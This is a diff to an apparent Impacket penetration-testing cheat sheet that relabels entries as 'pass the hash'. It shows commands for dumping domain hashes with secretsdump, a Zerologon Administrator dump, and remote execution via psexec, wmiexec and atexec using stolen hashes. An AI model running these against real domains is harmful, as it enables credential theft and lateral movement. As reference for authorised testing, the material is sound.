@@ -59,7 +59,7 @@ secretsdump.py '<domain>/<user>:<pass>'@<ip>
 
 ## secretsdump local dump hash
 ```
-secretsdump.py  -ntds <ntds_file.dit> -system <SYSTEM_FILE> -hashes lmhash:nthash LOCAL -outputfile <ntlm-extract-file>
+secretsdump.py  -ntds <ntds_file.dit> -system <SYSTEM_FILE> -hashes <lmhash:nthash> LOCAL -outputfile <ntlm-extract-file>
 ```
 
 ## secretsdump - anonymous get administrator (zerologon)
@@ -74,7 +74,7 @@ secretsdump.py <domain>/<dc_bios_name>\$/@<ip> -no-pass -just-dc-user "Administr
 psexec.py <domain>/<user>:<password>@<ip>
 ```
 
-## PSEXEC with Hash // create a new service (using \pipe\svcctl via SMB)
+## PSEXEC with pass the Hash (pth) // create a new service (using \pipe\svcctl via SMB)
 ```
 psexec.py -hashes <hash> <user>@<ip>
 ```
@@ -89,7 +89,7 @@ export KRB5CCNAME=<ccache_file>; psexec.py -dc-ip <dc_ip> -target-ip <ip>> -no-p
 wmiexec.py <domain>/<user>:<password>@<ip>
 ```
 
-## wmiexec  with hash (execute a command shell without touching the disk or running a new service using DCOM)
+## wmiexec  with pass the hash (pth) (execute a command shell without touching the disk or running a new service using DCOM)
 ```
 wmiexec.py -hashes <hash> <user>@<ip>
 ```
@@ -99,7 +99,7 @@ wmiexec.py -hashes <hash> <user>@<ip>
 atexec.py <domain>/<user>:<password>@<ip> "command"
 ```
 
-## atexec hashes - execute command view the task scheduler (using \pipe\atsvc via SMB)
+## atexec pass the hash (pth) - execute command view the task scheduler (using \pipe\atsvc via SMB)
 ```
 atexec.py -hashes <hash> <user>@<ip> "command"
 ```
